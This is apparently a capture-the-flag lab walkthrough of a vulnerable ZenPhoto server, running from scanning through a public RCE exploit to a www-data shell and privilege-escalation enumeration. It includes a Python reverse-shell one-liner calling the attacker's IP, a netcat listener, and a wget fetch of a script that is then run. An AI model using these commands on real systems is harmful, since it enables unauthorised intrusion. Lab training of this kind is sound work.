# ZenPhoto

# Enumeration

## nmap

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.162.41                                                                                                                                 62 ⨯ 1 ⚙
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.162.41:22
Open 192.168.162.41:23
Open 192.168.162.41:80
Open 192.168.162.41:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-29 04:06 EST
Initiating Ping Scan at 04:06
Scanning 192.168.162.41 [2 ports]
Completed Ping Scan at 04:06, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:06
Completed Parallel DNS resolution of 1 host. at 04:06, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:06
Scanning 192.168.162.41 [4 ports]
Discovered open port 3306/tcp on 192.168.162.41
Discovered open port 80/tcp on 192.168.162.41
Discovered open port 23/tcp on 192.168.162.41
Discovered open port 22/tcp on 192.168.162.41
Completed Connect Scan at 04:06, 0.17s elapsed (4 total ports)
Nmap scan report for 192.168.162.41
Host is up, received syn-ack (0.17s latency).
Scanned at 2022-01-29 04:06:30 EST for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
23/tcp   open  telnet  syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 22 - SSH


## 23 - CUPS

```
┌──(kali㉿kali)-[~]
└─$ telnet 192.168.162.41 23                                                                                                                                      130 ⨯
Trying 192.168.162.41...
Connected to 192.168.162.41.
Escape character is '^]'.
help
Connection closed by foreign host.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$           
```


```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.162.41:23/                                        
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>403 Forbidden</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>403 Forbidden</H1>
<P></P>
</BODY>
</HTML>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh kali@localhost -L 8888:192.168.162.41:23                                
ssh: connect to host localhost port 22: Connection refused
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo systemctl restart ssh                                                                                                                                    255 ⨯
[sudo] password for kali: 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh kali@localhost -L 8888:192.168.162.41:23
kali@localhost's password: 
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 23 02:34:46 2022
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run “touch ~/.hushlogin” to hide this message)
┌──(kali㉿kali)-[~]
└─$ 

```

![](Pasted%20image%2020220129193603.png)

## 80 - Web

### Dir Brute Forcing
```
200        4l        5w       75c http://192.168.162.41/index
200        4l        5w       75c http://192.168.162.41/index.html
301        9l       28w      315c http://192.168.162.41/test
```

![](Pasted%20image%2020220129172529.png)

Googling for admin page

https://www.google.com/search?q=zenphoto+default+credentials&oq=zenphoto+default+credentials&aqs=chrome.0.69i59.4384j0j7&sourceid=chrome&ie=UTF-8
* https://www.inmotionhosting.com/support/website/login-zenphoto/#:~:text=To%20log%20into%20Zenphoto%2C%20add,%2Fzp%2Dcore%2Fadmin.

![](Pasted%20image%2020220129173105.png)

## 3306 - MySQL

# Exploitation
https://www.exploit-db.com/exploits/18083
Checking if the path in the exploit exists `{$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php`

![](Pasted%20image%2020220129173441.png)


```
┌──(kali㉿kali)-[~/Documents]
└─$ searchsploit zenphoto 
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZenPhoto - 'admin-news-articles.php' Cross-Site Scripting                                                                             | php/webapps/37903.txt
ZenPhoto - 'index.php' SQL Injection                                                                                                  | php/webapps/38326.txt
ZenPhoto - Config Update / Command Execution                                                                                          | php/webapps/15114.php
ZenPhoto - SQL Injection                                                                                                              | php/webapps/39062.txt
ZenPhoto 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                                                     | php/webapps/27795.txt
ZenPhoto 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                          | php/webapps/27796.txt
ZenPhoto 1.1.3 - 'rss.php?albumnr' SQL Injection                                                                                      | php/webapps/4823.pl
ZenPhoto 1.2.5 - Completely Blind SQL Injection                                                                                       | php/webapps/9154.js
ZenPhoto 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                                                     | php/webapps/34611.txt
ZenPhoto 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                                              | php/webapps/34610.txt
ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                                                      | php/webapps/35648.txt
ZenPhoto 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                                                        | php/webapps/17200.txt
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                     | php/webapps/18083.php
ZenPhoto 1.4.10 - Local File Inclusion                                                                                                | php/webapps/38841.txt
ZenPhoto 1.4.11 - Remote File Inclusion                                                                                               | php/webapps/39571.txt
ZenPhoto 1.4.3.3 - Multiple Vulnerabilities                                                                                           | php/webapps/22524.txt
ZenPhoto 1.4.8 - Multiple Vulnerabilities                                                                                             | php/webapps/37602.txt
ZenPhoto CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                                                | php/webapps/14359.html
ZenPhoto Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                            | php/webapps/9166.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
MOAUB #26 - Zenphoto - Config Update / Command Execution                                                                              | docs/english/15115-moaub-26---ze
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents]
└─$ cd /tmp                                                                                                                            
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 18083
  Exploit: ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18083
     Path: /usr/share/exploitdb/exploits/php/webapps/18083.php
File Type: PHP script, ASCII text

Copied to: /tmp/18083.php


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18083.php                                                                                

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

Usage......: php 18083.php <host> <path>

Example....: php 18083.php localhost /
Example....: php 18083.php localhost /zenphoto/
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ php 18083.php 192.168.162.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

zenphoto-shell# ls /usr/bin | grep python
python
python2
python2.6

zenphoto-shell# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.162",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

[-] Exploit failed!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.162] from (UNKNOWN) [192.168.162.41] 50048
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ cd /home
cd /home
www-data@offsecsrv:/home$ ls
ls
local.txt
www-data@offsecsrv:/home$ cat local.txt
cat local.txt
5651465f2edc144d81fec47102245f71
www-data@offsecsrv:/home$ ifconfig
ifconfig
Command 'ifconfig' is available in '/sbin/ifconfig'
The command could not be located because '/sbin' is not included in the PATH environment variable.
This is most likely caused by the lack of administrative priviledges associated with your user account.
ifconfig: command not found
www-data@offsecsrv:/home$ cat local.txt
cat local.txt
5651465f2edc144d81fec47102245f71
www-data@offsecsrv:/home$ /sbin/ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:ba:71:03  
          inet addr:192.168.162.41  Bcast:192.168.162.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:7103/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:216081 errors:2 dropped:4 overruns:0 frame:0
          TX packets:214640 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:21388806 (21.3 MB)  TX bytes:45792862 (45.7 MB)
          Interrupt:18 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:792 errors:0 dropped:0 overruns:0 frame:0
          TX packets:792 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:80982 (80.9 KB)  TX bytes:80982 (80.9 KB)

www-data@offsecsrv:/home$ 
```

![](Pasted%20image%2020220129173716.png)

# Privesc
## Enum

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                       
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.162.41 - - [29/Jan/2022 04:38:28] "GET /lse.sh HTTP/1.0" 200 -


```


```
www-data@offsecsrv:/$ cd /tmp
cd /tmp
www-data@offsecsrv:/tmp$ wget 192.168.162.41/lse.sh
wget 192.168.162.41/lse.sh
--2022-01-29 09:38:14--  http://192.168.162.41/lse.sh
Connecting to 192.168.162.41:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2022-01-29 09:38:14 ERROR 404: Not Found.

www-data@offsecsrv:/tmp$ wget 192.168.49.162/lse.sh 
wget 192.168.49.162/lse.sh
--2022-01-29 09:38:30--  http://192.168.49.162/lse.sh
Connecting to 192.168.49.162:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: `lse.sh'

100%[======================================>] 43,570       124K/s   in 0.3s    

2022-01-29 09:38:31 (124 KB/s) - `lse.sh' saved [43570/43570]

www-data@offsecsrv:/tmp$ chmod +x lse.sh
chmod +x lse.sh
www-data@offsecsrv:/tmp$ ./lse.sh
./lse.sh
\e[90m---
\e[97mIf you know the current user password, write it here to check sudo privileges: \e[0;0m

\e[90m---

\e[96m LSE Version:\e[0;0m 3.7

\e[94m        User:\e[0;0m www-data
\e[94m     User ID:\e[0;0m 33
\e[94m    Password:\e[0;0m \e[90mnone\e[0;0m
\e[94m        Home:\e[0;0m /var/www
\e[94m        Path:\e[0;0m /usr/local/bin:/usr/bin:/bin
\e[94m       umask:\e[0;0m 0022

\e[94m    Hostname:\e[0;0m offsecsrv
\e[94m       Linux:\e[0;0m 2.6.32-21-generic
\e[94mDistribution:\e[0;0m Ubuntu 10.04.3 LTS
\e[94mArchitecture:\e[0;0m i686

\e[35m==================================================================(\e[32m users \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr000\e[97m Current user groups\e[90m.............................................\e[34m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr010\e[97m Is current user in an administrative group?\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr020\e[97m Are there other users in administrative groups?\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90musr030\e[97m Other users with shell\e[90m..........................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90musr040\e[97m Environment information\e[90m......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr050\e[97m Groups for other users\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90musr060\e[97m Other users\e[90m..................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90musr070\e[97m PATH variables defined inside /etc\e[90m..............................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90musr080\e[97m Is '.' in a PATH variable defined inside /etc?\e[90m.................. \e[90mnope\e[0;0m
\e[35m===================================================================(\e[32m sudo \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msud000\e[97m Can we sudo without a password?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msud010\e[97m Can we list sudo commands without a password?\e[90m...................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
usage: sudo -h | -K | -k | -L | -V
usage: sudo -v [-AknS] [-p prompt]
usage: sudo -l[l] [-AknS] [-g groupname|#gid] [-p prompt] [-U username] [-u
            username|#uid] [-g groupname|#gid] [command]
usage: sudo [-AbEHknPS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
            username|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
            username|#uid] file ...
\e[90m---\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud040\e[97m Can we read sudoers files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msud050\e[97m Do we know if any other users used sudo?\e[90m........................ \e[90mnope\e[0;0m
\e[35m============================================================(\e[32m file system \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst000\e[97m Writable files outside user's home\e[90m..............................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst010\e[97m Binaries with setuid bit\e[90m........................................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst020\e[97m Uncommon setuid binaries\e[90m........................................\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/lppasswd
/usr/bin/X
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
\e[90m---\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst030\e[97m Can we write to any setuid binary?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst040\e[97m Binaries with setgid bit\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst050\e[97m Uncommon setgid binaries\e[90m........................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90mfst060\e[97m Can we write to any setgid binary?\e[90m.............................. \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mfst070\e[97m Can we read /root?\e[90m.............................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst080\e[97m Can we read subdirectories under /home?\e[90m......................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst090\e[97m SSH files in home directories\e[90m................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst100\e[97m Useful binaries\e[90m.................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst110\e[97m Other interesting files in home directories\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst120\e[97m Are there any credentials in fstab/mtab?\e[90m........................ \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst130\e[97m Does 'www-data' have mail?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst140\e[97m Can we access other users mail?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst150\e[97m Looking for GIT/SVN repositories\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst160\e[97m Can we write to critical files?\e[90m................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst170\e[97m Can we write to critical directories?\e[90m........................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst180\e[97m Can we write to directories from PATH defined in /etc?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst190\e[97m Can we read any backup?\e[90m......................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst200\e[97m Are there possible credentials in any shell history file?\e[90m....... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mfst210\e[97m Are there NFS exports with 'no_root_squash' option?\e[90m............. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mfst220\e[97m Are there NFS exports with 'no_all_squash' option?\e[90m.............. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mfst500\e[97m Files owned by user 'www-data'\e[90m.................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst510\e[97m SSH files anywhere\e[90m.............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst520\e[97m Check hosts.equiv file and its contents\e[90m......................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst530\e[97m List NFS server shares\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mfst540\e[97m Dump fstab file\e[90m................................................. \e[90mskip
\e[35m=================================================================(\e[32m system \e[35m)=====\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys000\e[97m Who is logged in\e[90m................................................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys010\e[97m Last logged in users\e[90m............................................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msys020\e[97m Does the /etc/passwd have hashes?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys022\e[97m Does the /etc/group have hashes?\e[90m................................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msys030\e[97m Can we read shadow files?\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys040\e[97m Check for other superuser accounts\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msys050\e[97m Can root user log in via SSH?\e[90m...................................\e[36m yes!\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msys060\e[97m List available shells\e[90m........................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys070\e[97m System umask in /etc/login.defs\e[90m................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msys080\e[97m System password policies in /etc/login.defs\e[90m..................... \e[90mskip
\e[35m===============================================================(\e[32m security \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec000\e[97m Is SELinux present?\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec010\e[97m List files with capabilities\e[90m.................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec020\e[97m Can we write to a binary with caps?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec030\e[97m Do we have all caps in any binary?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msec040\e[97m Users with associated capabilities\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msec050\e[97m Does current user have capabilities?\e[90m............................ \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msec060\e[97m Can we read the auditd log?\e[90m..................................... \e[90mnope\e[0;0m
\e[35m========================================================(\e[32m recurrent tasks \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret000\e[97m User crontab\e[90m.................................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret010\e[97m Cron tasks writable by user\e[90m..................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret020\e[97m Cron jobs\e[90m.......................................................\e[36m yes!\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret030\e[97m Can we read user crontabs\e[90m....................................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret040\e[97m Can we list other user cron tasks?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mret050\e[97m Can we write to any paths present in cron jobs\e[90m..................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret060\e[97m Can we write to executable paths present in cron jobs\e[90m...........\e[92m yes!\e[0;0m
\e[90m---\e[0;0m
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -n 200 -r -0 rm
/etc/cron.d/php5:09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -type f -cmin +$(/usr/lib/php5/maxlifetime) -print0 | xargs -n 200 -r -0 rm
\e[90m---\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mret400\e[97m Cron files\e[90m...................................................... \e[90mskip
\e[97m[\e[93m*\e[97m] \e[90mret500\e[97m User systemd timers\e[90m............................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mret510\e[97m Can we write in any system timer?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mret900\e[97m Systemd timers\e[90m.................................................. \e[90mskip
\e[35m================================================================(\e[32m network \e[35m)=====\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90mnet000\e[97m Services listening only on localhost\e[90m............................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90mnet010\e[97m Can we sniff traffic with tcpdump?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90mnet500\e[97m NIC and IP information\e[90m.......................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet510\e[97m Routing table\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet520\e[97m ARP table\e[90m....................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet530\e[97m Nameservers\e[90m..................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet540\e[97m Systemd Nameservers\e[90m............................................. \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet550\e[97m Listening TCP\e[90m................................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90mnet560\e[97m Listening UDP\e[90m................................................... \e[90mskip
\e[35m===============================================================(\e[32m services \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv000\e[97m Can we write in service files?\e[90m.................................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv010\e[97m Can we write in binaries executed by services?\e[90m.................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv020\e[97m Files in /etc/init.d/ not belonging to root\e[90m..................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv030\e[97m Files in /etc/rc.d/init.d not belonging to root\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv040\e[97m Upstart files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv050\e[97m Files in /usr/local/etc/rc.d not belonging to root\e[90m.............. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv400\e[97m Contents of /etc/inetd.conf\e[90m..................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv410\e[97m Contents of /etc/xinetd.conf\e[90m.................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv420\e[97m List /etc/xinetd.d if used\e[90m...................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv430\e[97m List /etc/init.d/ permissions\e[90m................................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv440\e[97m List /etc/rc.d/init.d permissions\e[90m............................... \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv450\e[97m List /usr/local/etc/rc.d permissions\e[90m............................ \e[90mskip
\e[97m[\e[94mi\e[97m] \e[90msrv460\e[97m List /etc/init/ permissions\e[90m..................................... \e[90mskip
\e[97m[\e[91m!\e[97m] \e[90msrv500\e[97m Can we write in systemd service files?\e[90m.......................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msrv510\e[97m Can we write in binaries executed by systemd services?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msrv520\e[97m Systemd files not belonging to root\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[94mi\e[97m] \e[90msrv900\e[97m Systemd config files permissions\e[90m................................ \e[90mskip
\e[35m===============================================================(\e[32m software \e[35m)=====\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof000\e[97m Can we connect to MySQL with root/root credentials?\e[90m............. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof010\e[97m Can we connect to MySQL as root without password?\e[90m............... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof015\e[97m Are there credentials in mysql_history file?\e[90m.................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as postgres and no pass?\e[90m. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template0 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof020\e[97m Can we connect to PostgreSQL template1 as psql and no pass?\e[90m..... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof030\e[97m Installed apache modules\e[90m........................................\e[36m yes!\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof040\e[97m Found any .htpasswd files?\e[90m...................................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof050\e[97m Are there private keys in ssh-agent?\e[90m............................ \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof060\e[97m Are there gpg keys cached in gpg-agent?\e[90m......................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof070\e[97m Can we write to a ssh-agent socket?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof080\e[97m Can we write to a gpg-agent socket?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof090\e[97m Found any keepass database files?\e[90m............................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof100\e[97m Found any 'pass' store directories?\e[90m............................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof110\e[97m Are there any tmux sessions available?\e[90m.......................... \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof120\e[97m Are there any tmux sessions from other users?\e[90m................... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof130\e[97m Can we write to tmux session sockets from other users?\e[90m.......... \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof140\e[97m Are any screen sessions available?\e[90m.............................. \e[90mnope\e[0;0m
\e[97m[\e[93m*\e[97m] \e[90msof150\e[97m Are there any screen sessions from other users?\e[90m................. \e[90mnope\e[0;0m
\e[97m[\e[91m!\e[97m] \e[90msof160\e[97m Can we write to screen session sockets from other users?\e[90m........ \e[90mnope\e[0;0m
